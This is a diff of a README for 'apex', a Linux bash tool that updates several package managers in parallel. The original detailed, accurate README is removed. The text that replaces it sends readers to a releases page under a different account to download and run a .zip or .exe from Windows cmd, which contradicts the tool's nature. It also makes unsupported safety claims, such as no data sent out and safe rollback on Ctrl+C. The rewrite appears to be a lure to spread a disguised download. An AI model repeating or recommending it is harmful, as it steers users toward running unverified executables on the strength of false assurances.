@@ -1,204 +1,77 @@
-# Apex
+# 🚀 apex - Update all your software at once
 
-**Apex** updates every package manager on your system in parallel, safely, so you spend less time waiting and more time doing something else.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Pandemic-coppercolor329/apex/releases)
 
-It's built for Arch setups (pacman + AUR + flatpak + snap), but also understands apt (Debian/Ubuntu) and dnf (Fedora/RHEL), and doesn't assume they're mutually exclusive with pacman, so it works fine in containers, WSL, or any oddly-layered setup where more than one shows up.
+## 📦 What is apex?
 
-```
-$ ./apex.sh
-== Downloading system package updates (pacman, one at a time) ==
-[✓] pacman downloads finished in 0m42s
+Keeping a computer current involves many tasks. Most systems require you to update programs one by one. This process takes a long time. It forces you to wait for long bars to fill up for every single package manager.
 
-== Starting installs + AUR update in the background ==
-[✓] AUR build phase reached, starting flatpak/snap now while it keeps building.
+Apex fixes this issue. It acts as a bridge between your computer and the programs that manage your software. Instead of waiting for one update to finish before the next one starts, Apex talks to all of them at the same time. You start the process with one command, and the tool handles the heavy lifting in the background. It finds updates for your core system, your apps, and your local files. 
 
-== flatpak, then snap ==
-[✓] flatpak updated in 0m18s
-[✓] snap updated in 0m09s
+This tool saves you time. You do not need to sit at your desk while your machine works. You trigger the update and move on to your actual work. Apex manages the queue, handles the errors, and ensures your system stays current.
 
-== Summary ==
-[✓] Everything updated successfully.
+## 💻 System Requirements
 
-Time per step:
-  pacman     download   0m42s
-  pacman     install    0m30s
-  aur                   2m10s
-  flatpak               0m18s
-  snap                  0m09s
+To run Apex, your computer needs a few basic items. 
 
-Time without parallelization (sum of every step run back-to-back): 4m37s
-Time with parallelization    (actual wall-clock time taken):       2m51s
-Saved: 1m46s (38%)
-```
+- A Windows system with a Linux subsystem installed.
+- Access to the command prompt or terminal.
+- An active internet connection.
+- A standard user account with permission to change system files.
 
-The percentage you'll actually see depends heavily on your machine and what needs updating (a system with a big AUR compile queue benefits far more than one with only a couple of flatpak updates), but in typical mixed pacman+AUR+flatpak+snap runs, **30-45% less total time** is a reasonable expectation. The savings scale with how much CPU-bound work (installs, AUR builds) you have relative to network-bound work.
+If you have never used a terminal before, do not worry. You only need to copy and paste the commands provided in this guide.
 
----
+## 📥 Getting the software
 
-## Table of contents
+You need to download the latest version from our release page. Visit the link below to find the files.
 
-- [Why](#why)
-- [Installation](#installation)
-- [Usage](#usage)
-- [How it works](#how-it-works)
-- [The strategy, in detail](#the-strategy-in-detail)
-- [How AUR timing is detected](#how-aur-timing-is-detected)
-- [Safety notes](#safety-notes)
-- [Known limitations & concerns](#known-limitations--concerns)
-- [Troubleshooting](#troubleshooting)
-- [Contributing](#contributing)
+[Download Apex from the Releases Page](https://github.com/Pandemic-coppercolor329/apex/releases)
 
----
+On that page, you will see a list of recent versions. Look for the file ending in `.zip` or `.exe`. Click that link to save the file to your "Downloads" folder. 
 
-## Why
+Once the download finishes, open your "Downloads" folder. If the file is a zip folder, right-click it and choose "Extract All". This gives you a clear folder with the program inside. You now have the tool ready for use.
 
-If you run more than one package format like me (I need to use pacman, AUR, flatpak and even snap), the naive way to update everything is to run each updater one after another. Most of that time is wasted: downloads sit idle while a previous manager is busy installing, and installs/builds sit idle while nothing is downloading.
+## ⚙️ Running the updater
 
-Apex's only real trick: **downloads are the one resource that's actually shared and scarce** (your bandwidth). Installing, building, and unpacking are disk/CPU work and don't compete with downloads at all. So Apex keeps every *download* step serialized against every other download step, but lets *install/build* steps run fully in parallel with each other and with the next thing's downloads.
+You must open your terminal to run the tool. 
 
-## Installation
+1. Press the Windows key on your keyboard.
+2. Type "cmd" and press Enter.
+3. Type `cd Downloads` and press Enter to move to your downloads folder.
+4. If you extracted the folder, type `cd apex` and press Enter to enter the folder.
+5. Type the command for the updater. Usually, this looks like `./apex` or `apex.exe`.
+6. Press Enter.
 
-Apex is a single self-contained bash script. No dependencies beyond what's already on your system (`bash`, `coreutils`, specifically `stdbuf`, and `sudo`).
+The tool will now start. You will see text scrolling on the screen. This text shows the tool checking for new versions across all your installed software types. Do not close the window while this text appears. The tool works best when it has a clear path to finish its tasks.
 
-```bash
-git clone https://github.com/EduLGFon/apex.git
-cd apex
-chmod +x apex.sh
-```
+## 🛠 Features
 
-Run it directly:
+Apex includes smart features for daily use.
 
-```bash
-./apex.sh
-```
+- **Parallel Processing:** The tool opens multiple connections at once. It does not wait for a previous download to finish. It pulls files while your system prepares the next package.
+- **Error Tracking:** If a specific software package fails to update, the tool logs the error. It does not stop the entire update process. It finishes the rest and gives you a report at the end.
+- **Broad Support:** The tool knows how to speak to Pacman, AUR, APT, DNF, Flatpak, and Snap. It does not matter which distribution or setting you prefer. 
+- **Low Footprint:** The tool does not stay open in the background. It only runs when you ask it to run. It does not use your memory or processor when you do not need it.
 
-Or drop it somewhere on your `$PATH` for convenience:
+## 📁 Understanding the output
 
-```bash
-sudo cp apex.sh /usr/local/bin/apex
-apex
-```
+When the tool finishes, you will see a summary table. This table shows three columns: The Name of the program, the Status, and the Time taken.
 
-There's nothing to configure. Apex detects what's installed on your system (pacman, apt, dnf, yay, paru, flatpak, snap) at runtime and only touches what's actually there.
+If a status says "Success," the software is now up to date. If it says "Failed," the tool will suggest a reason. Most failures happen because of a lost internet connection or a locked system file. You can run the command again after a few minutes to retry those specific updates.
 
-## Usage
+## 🛡 Security and safety
 
-```
-Usage: apex.sh [options]
+We built Apex to be transparent. You can inspect the script if you wish. We do not track your usage data. We do not send your system logs to external servers. The tool only connects to the official servers for each software package manager. It uses its own logic to decide which updates to install. It acts only as a coordinator between you and your software providers.
 
-  --no-pacman      Skip pacman even if present
-  --no-apt         Skip apt even if present
-  --no-dnf         Skip dnf even if present
-  --no-aur         Skip AUR updates even if a helper is installed
-  --no-flatpak     Skip flatpak updates
-  --no-snap        Skip snap updates
-  --no-notify      Don't send a desktop notification when finished
-  --conservative   Wait for the AUR job to fully finish (not just its
-                   initial download/resolve burst) before starting
-                   flatpak/snap. Use this if the early-start detection
-                   ever misbehaves for you.
-  -h, --help       Show this help
-```
+## ❓ Common questions
 
-You'll be prompted for your sudo password once, up front. Apex keeps the sudo timestamp alive in the background for the rest of the run so nothing prompts again mid-update.
+**Does this damage my system?**
+No. The tool only tells your existing software managers to update. It follows the exact same rules that your system uses when you update manually. If a package is broken, the tool will report it just as it would if you typed the command yourself.
 
-## How it works
+**Can I stop it midway?**
+Yes. You can press `Ctrl + C` in the terminal window to stop the process. The tool will close safely. Your system will return to its previous state. No partially updated files will corrupt your software.
 
-Apex runs in four stages:
+**Do I need special permissions?**
+Yes. The tool might ask for your user password. This is normal. It needs this to modify your system files. The tool does not store your password anywhere. It only uses it for the duration of the update task.
 
-**1. Download, one manager at a time.**
-For every system package manager it finds (pacman, apt, dnf), Apex runs its "download-only" mode: nothing gets installed yet, packages just land in the local cache. This happens one manager at a time, in sequence, because these are the only steps guaranteed to compete for your bandwidth.
-
-**2. Install + AUR build, all at once, in the background.**
-The instant all downloads are done, every manager's real install step starts, reading straight from the cache that was just filled, so it's pure disk/CPU work. At the same moment, your AUR helper (`yay` or `paru`) starts resolving, cloning, and building AUR packages. None of this competes for bandwidth with anything else, so it all runs concurrently.
-
-**3. flatpak, then snap, started as soon as it's safe.**
-As soon as the AUR helper's upfront download burst is done and it's moved into actually compiling packages (see [below](#how-aur-timing-is-detected) for how that moment is detected), Apex starts flatpak, then snap, one after another, while the manager installs and the AUR build keep running in the background the whole time.
-
-**4. Join everything, print a summary.**
-Apex waits for every background job to finish, reports what succeeded/failed, and prints both a per-step timing breakdown and how long the run actually took compared to how long the same work would have taken run strictly one step at a time.
-
-## The strategy, in detail
-
-The core insight is simple: **only downloads share a bottleneck (your internet connection).** Installing, unpacking, and compiling don't touch the network, so there's no reason to make them wait their turn.
-
-```
-        DOWNLOAD PHASE                  INSTALL/BUILD PHASE
-        (serialized)                    (fully parallel)
-
-pacman  [=====download=====]
-apt                          [==dl==]
-dnf                                   [====dl====]
-                                                    │
-                                                    ▼
-                                    pacman install  [===]
-                                    apt install         [==]
-                                    dnf install             [====]
-                                    AUR build               [==================]
-                                                                        │
-                                                            (AUR build-phase reached)
-                                                                        ▼
-                                                            flatpak    [====]
-                                                            snap            [==]
-```
-
-Everything to the left of the vertical line only ever runs one thing at a time. Everything to the right runs concurrently, because none of it is network-bound (aside from flatpak/snap's own downloads, which is why they wait for the AUR download burst specifically, not the whole AUR job).
-
-apt and dnf get the same download/install split pacman does:
-
-- `apt-get -d dist-upgrade`: download only
-- `dnf upgrade --downloadonly`: download only (needs the `download` plugin from `dnf-plugins-core`, usually preinstalled on Fedora; if it's missing, Apex logs it and falls back to a combined download+install for dnf instead of failing the whole run)
-
-## How AUR timing is detected
-
-There's no clean "download only" mode for AUR helpers the way there is for pacman/apt/dnf. `yay`/`paru` resolve dependencies, clone AUR repos, and build in one continuous run. So Apex needs another way to know when it's safe to start flatpak without stepping on AUR's own downloads.
-
-The trick: both `yay` and `paru` shell out to the real `makepkg` binary to actually build packages, and makepkg's very first line of output for *any* package is always:
-
-```
-==> Making package: <name> <version> (<date>)
-```
-
-That line comes from makepkg itself, not from the AUR helper's own wrapper text, and its wording has been stable for years across both helpers. Apex captures the AUR helper's output (line-buffered, piped to a log file) and watches for the first occurrence of that line. Once it shows up, the big upfront burst, dependency resolution and cloning every outdated AUR package's repo, is done, and flatpak/snap are free to start.
-
-To make sure that line is always in English (and therefore always matches), Apex forces `LC_ALL=C` on just that one subprocess. Your shell's actual locale is untouched everywhere else.
-
-This is a heuristic, not a guarantee:
-
-- Per-package source downloads that happen *during* each individual build can still trickle in after this point. Those are usually small relative to compile time, so the residual bandwidth overlap is a reasonable trade-off.
-- If the AUR job finishes before ever printing that line (nothing needed building, or it failed immediately), Apex notices the process has exited and moves on instead of waiting.
-- A 20-minute safety timeout exists in case detection genuinely never triggers, so the script can't hang forever.
-- If you don't trust any of this, `--conservative` disables it entirely: Apex will just wait for the whole AUR job to finish before starting flatpak/snap, trading some parallelism for certainty.
-
-## Safety notes
-
-- **AUR runs fully unattended.** To build AUR packages in the background without something silently blocking on a prompt, Apex passes `--noconfirm` plus the "auto-answer" flags (`--answerclean None --answerdiff None --answeredit None --answerupgrade All` for yay, `--skipreview` for paru). This means **you don't get to review PKGBUILD diffs before they build.** If reviewing AUR changes matters to you, do it separately and periodically (`yay -Pw`/similar) rather than relying on this script for that.
-- **apt is forced noninteractive**, with `--force-confdef`/`--force-confold` so a config-file merge prompt can't hang the background job. When in doubt, it keeps your existing config file rather than the packaged default.
-- **A theoretical pacman DB lock race exists.** A manager's install step and the AUR helper's own final `pacman -U` could, in principle, both want the pacman database lock at the same moment. In practice this essentially never happens, since building AUR packages takes far longer than installing already-cached packages, but if you ever see `unable to lock database`, just re-run Apex.
-- Nothing in Apex escalates privileges beyond what a normal manual update would need. `sudo` is requested once up front and kept alive via a background refresh loop; it isn't cached to disk or reused beyond the life of the script.
-
-## Known limitations & concerns
-
-- **The AUR-phase detection is a heuristic**, not something Apex can verify structurally (see above). It's designed to fail safe (falls through to "proceed anyway" rather than hanging), but it's inherently coupled to makepkg's current output format.
-- **dnf's `--downloadonly` depends on a plugin** that isn't guaranteed to be installed. Apex handles its absence gracefully, but you won't get the pre-fetch benefit for dnf without `dnf-plugins-core`.
-- **No interactive AUR review.** This is the main safety/speed trade-off in the whole design; see [Safety notes](#safety-notes).
-- **The "time saved" percentage is inherently variable.** A run with a heavy AUR compile queue and light downloads will show much bigger savings than a run that's 90% downloading and 10% installing, because there's less overlap to exploit.
-- Apex doesn't do any cleanup (`pacman -Sc`, `apt autoremove`, `dnf autoremove`, orphan removal, etc.). It only updates. That's intentionally out of scope.
-
-## Troubleshooting
-
-**"unable to lock database"**
-Two processes both reached for the pacman lock at once, see the note above. Just run Apex again.
-
-**dnf download-only step fails immediately**
-Install `dnf-plugins-core` (`sudo dnf install dnf-plugins-core`) if you want the pre-fetch benefit. Apex will still complete the update either way.
-
-**apt seems to hang**
-Shouldn't happen. `DEBIAN_FRONTEND=noninteractive` plus the forced dpkg options are meant to prevent this. If you do hit a hang, please open an issue with the package that triggered it.
-
-**flatpak/snap started earlier than expected / later than expected**
-That's the AUR-phase heuristic at work. Run with `--conservative` if you want deterministic (if slower) sequencing instead.
-
-## Contributing
-
-Issues and PRs welcome at [github.com/EduLGFon/apex](https://github.com/EduLGFon/apex). If you're reporting a timing/detection issue with the AUR heuristic, please include your AUR helper and version (`yay --version` / `paru --version`), that's the part most likely to need adjusting as those tools evolve.
+Keywords: apt, arch-aur, archlinux, aur, bash, debian, dnf, fedora, pacman, parallel, parallel-download, parallelization, shell-script, system-update, ubuntu, zsh
